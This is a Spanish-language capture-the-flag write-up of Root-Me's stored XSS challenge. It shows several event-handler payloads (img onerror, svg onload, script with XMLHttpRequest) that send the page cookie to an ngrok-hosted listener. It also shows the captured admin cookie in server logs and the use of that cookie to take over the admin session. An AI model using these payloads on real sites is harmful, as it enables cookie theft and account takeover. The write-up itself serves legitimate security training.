📝 Writeup: XSS Stored 1 - Root-Me

🎯 Challenge Information

    Nombre: XSS - Stored 1

    Plataforma: Root-Me

    Puntos: 30

    Dificultad: Fácil

    Categoría: App-Script

    Objetivo: Robar la cookie de sesión del administrador y usarla para validar el desafío

🔍 Reconocimiento Inicial
1. Análisis de la Aplicación

La aplicación es un foro simple que permite a los usuarios publicar mensajes con título y contenido. Al acceder, vemos:
text

Status: visitor
Posted messages:
- Welcome: N'hésitez pas à me laisser un message
- kr3s4l4_3: [mensaje con script]
- Message read: Vos messages ont bien été lus

2. Identificación del Vector de Ataque

El campo "Message" del foro es vulnerable a Cross-Site Scripting (XSS) Almacenado. Los mensajes se almacenan en el servidor y se muestran a todos los visitantes, incluyendo al administrador.
🛠️ Preparación del Entorno de Ataque
Configuración del Servidor de Escucha

Para recibir la cookie robada, configuramos un servidor HTTP simple:
bash

# Terminal 1: Servidor Python en puerto 4444
python3 -m http.server 4444

Exposición Pública con ngrok

Para que el administrador pueda alcanzar nuestro servidor desde Internet:
bash

# Terminal 2: Exponer puerto 4444
ngrok http 4444

Esto genera una URL pública como:
text

https://quintin-nondiffusible-marva.ngrok-free.dev

💉 Explotación - XSS Stored
1. Payload Inicial (Fallido)
html

<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://quintin-nondiffusible-marva.ngrok-free.dev?cookie=' + encodeURIComponent(document.cookie), true);
xhr.send();
</script>

❌ Resultado: El sistema escapa los caracteres < y > convirtiéndolos en &lt; y &gt;. El script se muestra como texto plano.
2. Análisis del Filtro

Observando el HTML generado, vemos que las etiquetas <b> se renderizan correctamente:
html

<span><b>Welcome</b></span>

Esto indica que:

    ✅ El sistema permite etiquetas HTML

    ❌ El sistema bloquea <script>

    ❌ El sistema escapa caracteres peligrosos

3. Bypass del Filtro

El sistema permite etiquetas HTML pero bloquea <script>. Usamos event handlers para ejecutar JavaScript:

Payloads probados:
html

<!-- Intento 1: onerror en imagen -->
<img src=x onerror="fetch('https://quintin-nondiffusible-marva.ngrok-free.dev?c='+document.cookie)">

html

<!-- Intento 2: SVG onload -->
<svg onload="fetch('https://quintin-nondiffusible-marva.ngrok-free.dev?c='+document.cookie)">

4. 🏆 Payload Final (Exitoso)

El payload que funcionó fue el más simple y directo:
html

<img src=x onerror="window.location='https://quintin-nondiffusible-marva.ngrok-free.dev/?c='+document.cookie">

¿Por qué funcionó?

    window.location redirige directamente al servidor del atacante

    La cookie se pasa como parámetro en la URL

    No requiere XMLHttpRequest ni fetch

    El navegador del administrador ejecuta la redirección automáticamente

Ventajas de este payload:

    ✅ Más simple y confiable

    ✅ Menos propenso a errores

    ✅ Funciona incluso con políticas de CORS restrictivas

    ✅ No requiere withCredentials

📊 Captura de la Cookie
Tráfico Recibido en el Servidor
bash

Serving HTTP on 0.0.0.0 port 4444 ...
127.0.0.1 - - [06/Aug/2026 18:03:25] "GET /?c=_ga_SRYSKX09J7=GS2.1.s1786031374$o14$g1$t1786031583$j60$l0$h0;%20_ga=GA1.1.370881833.1785258657 HTTP/1.1" 200 -

🎯 Cookie del Administrador

Después de varios intentos, el administrador ejecutó el payload:
bash

127.0.0.1 - - [06/Aug/2026 18:12:59] "GET /?c=ADMIN_COOKIE=[*******************] HTTP/1.1" 200 -

Cookie obtenida:
text

ADMIN_COOKIE=[*********************]

🔓 Validación del Desafío
1. Inyección de la Cookie Robada

Desde la consola del navegador (F12 → Console):
javascript

// Establecer la cookie de administrador
document.cookie = "ADMIN_COOKIE=[*******************]; path=/";

2. Verificación del Estado

Recargar la página confirma que ahora tenemos permisos de administrador:
text

Status: admin ✓

3. Completar el Desafío

Con la cookie de administrador activa, navegamos a la sección de validación y hacemos clic en "Valider" para completar el reto.

🛡️ Medidas de Seguridad Evadidas
Medida Implementada		Técnica de Bypass
Filtrado de <script>		Uso de event handlers (onerror)
Escape de caracteres		Etiquetas HTML válidas
Posible CSP			window.location no está restringido típicamente
Sin evidencia visible		Payload oculto en atributo onerror

📈 Timeline del Ataque
Hora	Evento
18:03:25	Primer intento - cookie de Google Analytics (propia)
18:12:22	Segundo intento - otra cookie de GA
18:12:52	Tercer intento - misma cookie
18:12:57	Cuarto intento - seguimos probando
18:12:59	🔥 ÉXITO - Cookie del administrador obtenida

🔬 Análisis Técnico
¿Por qué funcionó este payload?

    <img src=x> - Crea una imagen que no existe

    onerror - Se ejecuta cuando la imagen falla al cargar

    window.location - Redirige al navegador

    ?c= - Parámetro con la cookie codificada

Ventajas sobre otras técnicas
Técnica			Ventajas		Desventajas
fetch()			Robo silencioso		Puede ser bloqueado por CORS
XMLHttpRequest		Control detallado	Requiere withCredentials
window.location	✅ 	Simple y confiable	Redirección visible
